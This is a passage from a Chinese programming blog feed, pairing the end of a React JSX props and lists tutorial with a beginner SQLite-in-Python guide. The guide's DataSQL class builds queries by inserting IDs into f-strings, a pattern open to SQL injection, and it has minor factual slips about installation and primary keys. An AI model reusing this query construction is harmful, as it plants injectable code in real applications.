<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// function Header() &#123;</span></span><br><span class="line"><span class="comment">//   return &lt;h1&gt;Develop. Preview. Ship. 🚀&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> <span class="attr">title</span>=<span class="string">&quot;React 💙&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ReactDOM.render(&lt;HomePage /&gt;, app)</span></span><br></pre></td></tr></table></figure>

<p> 子组件Header可以接受这些道具作为其第一个函数参数： </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params">props</span>) &#123;</span><br><span class="line"><span class="comment">//   return &lt;h1&gt;Develop. Preview. Ship. 🚀&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// function HomePage() &#123;</span></span><br><span class="line"><span class="comment">//   return (</span></span><br><span class="line"><span class="comment">//     &lt;div&gt;</span></span><br><span class="line"><span class="comment">//       &lt;Header title=&quot;React 💙&quot; /&gt;</span></span><br><span class="line"><span class="comment">//     &lt;/div&gt;</span></span><br><span class="line"><span class="comment">//   )</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ReactDOM.render(&lt;HomePage /&gt;, app)</span></span><br></pre></td></tr></table></figure>

<p>如果使用<code>console.log()</code>props，您可以看到它是一个具有title属性的对象。</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(props) <span class="comment">// &#123; title: &quot;React 💙&quot; &#125;</span></span><br><span class="line"><span class="comment">//   return &lt;h1&gt;React 💙&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// function HomePage() &#123;</span></span><br><span class="line"><span class="comment">//   return (</span></span><br><span class="line"><span class="comment">//     &lt;div&gt;</span></span><br><span class="line"><span class="comment">//       &lt;Header title=&quot;React 💙&quot; /&gt;</span></span><br><span class="line"><span class="comment">//     &lt;/div&gt;</span></span><br><span class="line"><span class="comment">//   )</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ReactDOM.render(&lt;HomePage /&gt;, app)</span></span><br></pre></td></tr></table></figure>

<p>由于props是一个对象，您可以使用对象析构函数来显式命名函数参数中的props值：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params">&#123; title &#125;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(title) <span class="comment">// &quot;React 💙&quot;</span></span><br><span class="line"><span class="comment">//  return &lt;h1&gt;React 💙&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// function HomePage() &#123;</span></span><br><span class="line"><span class="comment">//   return (</span></span><br><span class="line"><span class="comment">//     &lt;div&gt;</span></span><br><span class="line"><span class="comment">//       &lt;Header title=&quot;React 💙&quot; /&gt;</span></span><br><span class="line"><span class="comment">//     &lt;/div&gt;</span></span><br><span class="line"><span class="comment">//   )</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ReactDOM.render(&lt;HomePage /&gt;, app)</span></span><br></pre></td></tr></table></figure>

<p> 然后，您可以用标题变量替换<code>&lt;h1&gt;</code>标记的内容。 </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params">&#123; title &#125;</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(title);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果你在浏览器中打开你的项目，你会看到它显示的是实际的单词“title”。这是因为React认为您打算向DOM呈现一个纯文本字符串。</p>
<p> 您需要一种方法来向React表示这是一个JavaScript变量。 </p>
<h3 id="Using-Variables-in-JSX"><a href="#Using-Variables-in-JSX" class="headerlink" title="Using Variables in JSX"></a>Using Variables in JSX</h3><p> 要使用您定义的变量，您可以使用大括号｛｝，这是一种特殊的JSX语法，允许您直接在JSX标记中编写常规JavaScript。 </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// function Header(&#123;title&#125;) &#123;</span></span><br><span class="line"><span class="comment">//  console.log(title)</span></span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>

<p>当在“JSX land”中时，您可以将大括号视为输入“JavaScript land”的一种方式。您可以在大括号内添加任何JavaScript表达式（计算结果为单个值的表达式）。例如：</p>
<ol>
<li>带有点符号的<strong>对象属性</strong>。</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;props.title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>模板文字</strong>：</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params">&#123; title &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;`Cool $&#123;title&#125;`&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>函数的返回值</strong>。</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createTitle</span>(<span class="params">title</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (title) &#123;</span><br><span class="line">    <span class="keyword">return</span> title;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Default title&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params">&#123; title &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;createTitle(title)&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>或<strong>三元运算符</strong>。</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params">&#123; title &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;title ? title : &#x27;Default Title&#x27;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，可以将任何字符串传递给标题道具，由于您已经用三元运算符说明了组件中的默认情况，因此您甚至根本无法传递标题道具：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params">&#123; title &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;title ? title : &#x27;Default title&#x27;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>组件现在接受一个通用的标题道具，您可以在应用程序的不同部分中重用它。您只需更改标题：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> <span class="attr">title</span>=<span class="string">&quot;React 💙&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> <span class="attr">title</span>=<span class="string">&quot;A new title&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Iterating-through-lists"><a href="#Iterating-through-lists" class="headerlink" title="Iterating through lists"></a>Iterating through lists</h3><p> 通常需要将数据显示为列表。您可以使用数组方法来操作数据，并生成样式相同但包含不同信息的UI元素。 </p>
<ul>
<li>注意：React在数据获取方面是无限制的，这意味着您可以选择最适合您需求的解决方案。稍后，我们将在Next.js中讨论数据获取选项。但目前，您可以使用一个简单的数组来表示数据。</li>
</ul>
<p> 将名称数组添加到主页组件： </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> names = [<span class="string">&#x27;Ada Lovelace&#x27;</span>, <span class="string">&#x27;Grace Hopper&#x27;</span>, <span class="string">&#x27;Margaret Hamilton&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> <span class="attr">title</span>=<span class="string">&quot;Develop. Preview. Ship. 🚀&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 然后，您可以使用<code>array.map()</code>方法迭代数组，并使用箭头函数将名称映射到列表项： </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> names = [<span class="string">&#x27;Ada Lovelace&#x27;</span>, <span class="string">&#x27;Grace Hopper&#x27;</span>, <span class="string">&#x27;Margaret Hamilton&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> <span class="attr">title</span>=<span class="string">&quot;Develop. Preview. Ship. 🚀&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;names.map((name) =&gt; (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ))&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 请注意，如何使用大括号在“JavaScript”和“JSX”区域中来回编织的。 </p>
<p> 如果您运行此代码，React将向我们发出关于缺少密钥道具的警告。这是因为React需要一些东西来唯一标识数组中的项，这样它就知道要更新DOM中的哪些元素。 </p>
<p> 现在可以使用这些名称，因为它们当前是唯一的，但建议使用保证唯一的名称，如物品ID。 </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> names = [<span class="string">&#x27;Ada Lovelace&#x27;</span>, <span class="string">&#x27;Grace Hopper&#x27;</span>, <span class="string">&#x27;Margaret Hamilton&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> <span class="attr">title</span>=<span class="string">&quot;Develop. Preview. Ship. 🚀&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;names.map((name) =&gt; (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;name&#125;</span>&gt;</span>&#123;name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ))&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Next.js</tag>
        <tag>React</tag>
        <tag>jsx</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLite初级入门</title>
    <url>/2023/11/26/2023-11-26-SQLite%E5%88%9D%E7%BA%A7%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h3 id="一、为什么要使用Sqlite"><a href="#一、为什么要使用Sqlite" class="headerlink" title="一、为什么要使用Sqlite"></a>一、为什么要使用Sqlite</h3><p>  此前，我一直采用的使用json存储数据的方法，这种方法虽然轻便，但操作复杂。而且实际操作的过程中，是将json的全部数据存入内存，再进行操作的，会出现一个情况就是随着数据量的增加而导致占用内存越来越多。</p>
<p>  使用数据库不仅可以提高效率并减少内存使用，而且还能提供更复杂的数据查询和操作功能。</p>
<p>  此外，数据库作为IT行业中非常常用的软件，这使我有不得不学习的理由。</p>
<h3 id="二、了解它"><a href="#二、了解它" class="headerlink" title="二、了解它"></a>二、了解它</h3><ul>
<li><h3 id="What-Is-SQLite"><a href="#What-Is-SQLite" class="headerlink" title="What Is SQLite?"></a>What Is SQLite?</h3><p> SQLite是一个C语言库，它实现了一个〔small〕(https:&#x2F;&#x2F;www.sqlite.org&#x2F;footprint.html)，<a href="https://www.sqlite.org/fasterthanfs.html">快速</a>，<a href="https://www.sqlite.org/selfcontained.html">自给自足</a>，<a href="https://www.sqlite.org/hirely.html">高可靠性</a>，<a href="https://www.sqlite.org/fullsql.html">功能齐全</a>，SQL数据库引擎。SQLite是<a href="https://www.sqlite.org/mostdeployed.html">最常用的</a>数据库引擎。SQLite内置于所有手机和大多数计算机中，并捆绑在人们每天使用的无数其他应用程序中。<a href="https://www.sqlite.org/about.html">更多信息…</a>  </p>
<p> SQLite<a href="https://www.sqlite.org/fileformat2.html">文件格式</a>是稳定的、跨平台的、向后兼容的，开发人员承诺（到2050年）保持这种状态(https:&#x2F;&#x2F;www.sqlite.org&#x2F;lts.html)。SQLite数据库文件通常用作在系统之间传输丰富内容的容器[<a href="https://www.sqlite.org/aff_short.html">1]</a>[<a href="https://www.sqlite.org/sqlar.html">2]</a>[<a href="https://www.sqlite.org/appfileformat.html">3]</a>并作为数据的长期存档格式[<a href="https://www.sqlite.org/locrsf.html">4]</a>。有超过1万亿（1e12）个SQLite数据库在积极使用[<a href="https://www.sqlite.org/mostdeployed.html">5]</a>。  </p>
<p> SQLite<a href="https://sqlite.org/src">源代码</a>在<a href="https://www.sqlite.org/copyright.html">公共领域</a>并且每个人都可以自由用于任何目的。  </p>
<p>​																—— 以上全文摘自SQLite官网</p>
</li>
</ul>
<p>讲的太明白了。</p>
<h3 id="三、最基本的使用"><a href="#三、最基本的使用" class="headerlink" title="三、最基本的使用"></a>三、最基本的使用</h3><pre><code> 我个人的理解，想要入门数据库，需要学会四点：创建数据库、从数据库插入数据、从数据库查询查询数据，学会以上四点，就没啥问题了。
</code></pre>
<p>​	而在Python中使用SQLite，首先就是安装它。</p>
<p>使用我们强大的pip！</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install pysqlite3 </span><br></pre></td></tr></table></figure>

<p>勿要用错安装命令嗷，开箱即用，安装完就可以直接用了。</p>
<h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 连接到数据库（如果不存在则创建）</span></span><br><span class="line">conn = sqlite3.connect(<span class="string">&#x27;data.db&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个游标对象</span></span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个表</span></span><br><span class="line">cursor.execute(<span class="string">&#x27;&#x27;&#x27;CREATE TABLE IF NOT EXISTS UserLib (  </span></span><br><span class="line"><span class="string">                    UserId TEXT PRIMARY KEY,  </span></span><br><span class="line"><span class="string">                    Username TEXT,</span></span><br><span class="line"><span class="string">                    DayQuantity int,</span></span><br><span class="line"><span class="string">                     Favorability real,</span></span><br><span class="line"><span class="string">                      Inauspicious int,</span></span><br><span class="line"><span class="string">                      Time DATE</span></span><br><span class="line"><span class="string">                 )&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 断开连接</span></span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>  只需要短短的几行代码，我们就可以创建数据库了。</p>
<p>  过程分为四步：</p>
<ul>
<li>连接</li>
<li>创建对象</li>
<li>使用execute执行命令</li>
<li>断开</li>
</ul>
<p>其中，execute中的命令尤为关键。</p>
<p>  数据库的表中我理解的情况是一个完整结构分为三部分：</p>
<ul>
<li><p>第一层：</p>
<ul>
<li>表名：上文的表名就是UserLib</li>
<li><code>CREATE TABLE IF NOT EXISTS UserLib</code>这条代码就成功创建了一个表名为UserLib的数据库。</li>
</ul>
</li>
<li><p>第二层：</p>
<ul>
<li>主键：上文的主键就是UserId，数据库主要就是通过这个来完成对数据的区分的。数据库的规则是，必须有主键，且主键的值唯一，也就是不能重复。</li>
<li><code>  UserId TEXT PRIMARY KEY</code>这条代码就定义了一个TEXT类型的主键，在数据库中TEXT表示字符串类型。</li>
</ul>
</li>
<li><p>第三层：</p>
<ul>
<li>次键：也就是普通的键，它的值有很多种，且可重复。</li>
<li>定义时只需要简单的定义一个键名和类型就可以了，像这样<code> Favorability real</code>，就定义了一个浮点数的类型。</li>
</ul>
</li>
<li><p>小记 ps:</p>
</li>
<li><p><code>ORDER BY</code>：用于对查询结果进行排序。</p>
</li>
<li><p><code>GROUP BY</code>：用于对查询结果进行分组。</p>
</li>
<li><p><code>HAVING</code>：用于对分组后的结果进行过滤。</p>
</li>
<li><p><code>LIMIT</code>：用于限制查询结果的数量。</p>
</li>
</ul>
<h4 id="存入数据"><a href="#存入数据" class="headerlink" title="存入数据"></a>存入数据</h4><p>数据库的存入也主要是利用SQL语句来进行操作的，即调用<code>execute()</code>方法。</p>
<p>在完成连接和创建的前提下，我们可以利用以下语句对已经存在的表UserLib插入一些数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cursor.execute(<span class="string">&quot;INSERT INTO UserLib VALUES (&#x27;ID1145124&#x27;, &#x27;Cure Sky&#x27;, 1, 1, 1, 1,0)&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>ps：<ul>
<li>在插入数据时，是按照键的顺序来插入的，可以小于键的数量但不能多于键的数量。毕竟如果超过了，本身就不存在更多的键了，数据库就会寄。</li>
</ul>
</li>
</ul>
<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>在存好数据后，想要把数据从数据库再提出来，也非常简单。</p>
<p>以下命令可以查询一个表中全部的数据，因为使用了通配符*，所以结构包含表中的全部内容。</p>
<p>同时我们使用了一个<code>fetchall()</code> 在执行完查询命令后实际上数据就到了游标对象这里，使用这个方法则是获取全部的数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个游标对象</span></span><br><span class="line">c = conn.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行查询语句 读取全部数据</span></span><br><span class="line">c.execute(<span class="string">&quot;SELECT * FROM UserLib&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有结果</span></span><br><span class="line">rows = c.fetchall()</span><br></pre></td></tr></table></figure>

<p>那么查询单列数据，则只需要指定ID就可以了。</p>
<p>这个语句可以查出符合<code> UserId = &#39;ID1145124&#39;</code>这个条件的数据，而通过前文我们知道，UserId是主键，自然就只返回一列了。</p>
<p>在这里我们返回数据结果调用的是<code>fetchone()</code>方法，这个方法只会返回一条数据，因为我们很清楚我们只查了一条。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cursor.execute(<span class="string">&#x27;&#x27;&#x27;SELECT * FROM UserLib WHERE UserId = &#x27;ID1145124&#x27;;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">Var = cursor.fetchone()</span><br></pre></td></tr></table></figure>

<p>如果要查询一条数据的某个键的话，只需要把<code>*</code>改为键名就可以了，像这样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cursor.execute(<span class="string">&#x27;&#x27;&#x27;SELECT DayQuantity FROM UserLib WHERE UserId = &#x27;ID1145124&#x27;;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">Num = cursor.fetchone()</span><br></pre></td></tr></table></figure>

<h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><p>修改数据同样是使用<code>execute()</code>方法执行SQL语句进行操作的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cursor.execute(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        UPDATE UserLib</span></span><br><span class="line"><span class="string">        SET DayQuantity = 23333</span></span><br><span class="line"><span class="string">        WHERE UserID = &#x27;ID1145124&#x27;;</span></span><br><span class="line"><span class="string">                 &#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.commit()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>

<p>SQL语句主要分为三个部分：</p>
<ul>
<li><p>第一部分：</p>
<ul>
<li><code>UPDATE UserLib</code>：这条代码指定了数据更新的表。</li>
</ul>
</li>
<li><p>第二部分：</p>
<ul>
<li><code>SET DayQuantity = 23333</code>：这条代码指定了一个键以及这个键的内容，简单来说就是将<code>DayQuantity </code>的值改成了<code>23333</code>，像变量赋值一样简单。</li>
</ul>
</li>
<li><p>第三部分：</p>
<ul>
<li><code>WHERE UserID = &#39;ID1145124&#39;;</code>指定了主键，虽说是修改某个键的值，但如果不说是哪个主键，数据库可不知道咋改。</li>
</ul>
</li>
</ul>
<p>看到这里，恭喜你，数据库已经入门啦~（仅限身娇体柔又可爱的SQLite）</p>
<h3 id="四、构造数据库类"><a href="#四、构造数据库类" class="headerlink" title="四、构造数据库类"></a>四、构造数据库类</h3><p>  这个是我自己想出来的，针对同一个数据库可能有不同的繁多的操作，一条一条代码的反复去写非常麻烦，使用函数代替的话也需要不断的重复连接、创建游标这个过程。我们可以借助面向对象语言的特性来封装一个数据库类，只需要实例化类然后调用它的方法，就可以进行繁多的操作了。</p>
<p>  以下代码是我在实际项目中对此的应用，可以参考一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DataSQL</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 数据库对象 &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        path = os.getcwd() + <span class="string">&#x27;/data/MoreGoodJrrpData/MoreGoodJrrpData.db&#x27;</span></span><br><span class="line">        self.conn = sqlite3.connect(path)</span><br><span class="line">        <span class="comment"># 连接到数据库（如果不存在则创建）</span></span><br><span class="line">        self.cursor = self.conn.cursor()</span><br><span class="line">        <span class="comment"># 创建一个游标对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">InIt</span>(<span class="params">self, ID, ImageName: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; 初始化新用户的数据 &quot;&quot;&quot;</span></span><br><span class="line">        Time = NtpTime()</span><br><span class="line">        LuckValue = <span class="number">0</span></span><br><span class="line">        LuckQuantity = <span class="number">0</span></span><br><span class="line">        Inauspicious = <span class="number">0</span></span><br><span class="line">        Value = IfLuck(ImageName)  <span class="comment"># 判断吉凶</span></span><br><span class="line">        LuckValue += Value</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Value &gt; <span class="number">0</span>:</span><br><span class="line">            LuckQuantity += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Inauspicious += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        sql = <span class="string">f&quot;INSERT INTO UserLib VALUES (&#x27;<span class="subst">&#123;ID&#125;</span>&#x27;, &#x27;未命名用户&#x27;, 1, 0, &#x27;<span class="subst">&#123;LuckQuantity&#125;</span>&#x27;, &#x27;<span class="subst">&#123;Inauspicious&#125;</span>&#x27;, &#x27;<span class="subst">&#123;LuckValue&#125;</span>&#x27;,&#x27;<span class="subst">&#123;Time&#125;</span>&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">        self.cursor.execute(sql)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存（提交）更改</span></span><br><span class="line">        self.conn.commit()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 关闭连接</span></span><br><span class="line">        self.conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">TodayUpdate</span>(<span class="params">self, ID, ImageName: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; 抽签数据更新&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># try:</span></span><br><span class="line">        <span class="comment"># self.cursor.execute()</span></span><br><span class="line">        <span class="comment"># 查询时间</span></span><br><span class="line">        self.cursor.execute(<span class="string">f&#x27;&#x27;&#x27;SELECT Time FROM UserLib WHERE UserId = &#x27;<span class="subst">&#123;ID&#125;</span>&#x27;;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            Time = self.cursor.fetchone()[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 判断时间时间否更新</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> TimeJudgement(<span class="built_in">str</span>(Time)):</span><br><span class="line">                _ = TimeJudgement(<span class="built_in">str</span>(Time))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                _, Time = TimeJudgement(<span class="built_in">str</span>(Time))</span><br><span class="line">            <span class="keyword">if</span> _:</span><br><span class="line">                <span class="comment"># 查到了，开始更新数据</span></span><br><span class="line">                self.cursor.execute(</span><br><span class="line">                    <span class="string">f&#x27;&#x27;&#x27;SELECT DayQuantity, Favorability, LuckQuantity, Inauspicious, LuckValue  FROM UserLib WHERE UserId = &#x27;<span class="subst">&#123;ID&#125;</span>&#x27;;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">                DayQuantity, Favorability, LuckQuantity, Inauspicious, LuckValue = self.cursor.fetchone()</span><br><span class="line">                DayQuantity += <span class="number">1</span></span><br><span class="line">                Favorability += <span class="number">5</span></span><br><span class="line">                Value = IfLuck(ImageName)  <span class="comment"># 判断吉凶</span></span><br><span class="line">                LuckValue += Value</span><br><span class="line">                <span class="keyword">if</span> Value &gt; <span class="number">0</span>:</span><br><span class="line">                    